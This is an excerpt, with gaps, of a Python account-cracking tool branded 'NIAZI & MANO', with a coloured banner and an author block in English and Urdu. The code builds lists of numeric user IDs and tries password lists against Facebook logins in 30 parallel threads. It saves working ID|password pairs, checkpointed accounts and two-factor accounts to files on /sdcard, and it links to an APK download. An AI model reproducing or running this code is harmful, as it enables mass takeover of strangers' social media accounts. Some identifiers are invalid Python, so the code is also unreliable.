...
\033[1;37m$$  __$$\ $$ |  $$ |$$  __$$\ $$$\  $$ |$$  __$$\ 
\033[1;34m$$ /  \__|$$ |  $$ |$$ /  $$ |$$$$\ $$ |$$ |  $$ |
\033[1;35m$$ |      $$$$$$$$ |$$$$$$$$ |$$ $$\$$ |$$ |  $$ |\033[1;34m𝐏 \033[1;37m
\033[1;37m$$ |      $$  __$$ |$$  __$$ |$$ \$$$$ |$$ |  $$ |\033[1;31m 𝐑\033[1;37m
\033[1;34m$$ |  $$\ $$ |  $$ |$$ |  $$ |$$ |\$$$ |$$ |  $$ |\033[1;35m𝐎 \033[1;37m
\033[1;35m\$$$$$$  |$$ |  $$ |$$ |  $$ |$$ | \$$ |$$$$$$$  |
\033[1;37m \______/ \__|  \__|\__|  \__|\__|  \__|\_______/                                                                                                                                                         
----------------------------------------------
 Author    :  ALIYAN NIAZI
 Github    : NIAZI-MANO
 Facebook  : NIAZI
 Tool Name : NIAZI. MANO
 GF              :  MANO
 Tool type : FREE
----------------------------------------------
 For Haters:  SORRY .کتنا عجیب لفظ ھے 
۔                                                    ڈاکٹر کہے تو بندہ ختم  .  بندہ کہے تو غصّہ ختم۔
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def public():
        ...
        try:
                ...
                os.system('python NIAZI & MANO.py')
        except requests.exceptions.ConnectionError:
                exit(f' No internet connection')
        except (KeyError,IOError):
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/NIAZI & MANO_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as NIAZI & MANO:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                NIAZI & MANO.submit(rndm,ids,passlist)
                print('\033[1;31m ')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [NIAZI & MANO-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        NIAZI & MANO=session.cookies.get_dict().keys()
                        if "c_user" in NIAZI & MANO:
                                print('\r\r\033[1;32m [NIAZI & MANO-OK] %s | %s'%(ids,pas))
                                open('/sdcard/NIAZI & MANO-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in NIAZI & MANO:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [NIAZI & MANO-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NIAZI & MANO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [NIAZI & MANO-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NIAZI & MANO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[NIAZI & MANO-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [NIAZI & MANO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NIAZI & MANO-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [NIAZI & MANO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NIAZI & MANO-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
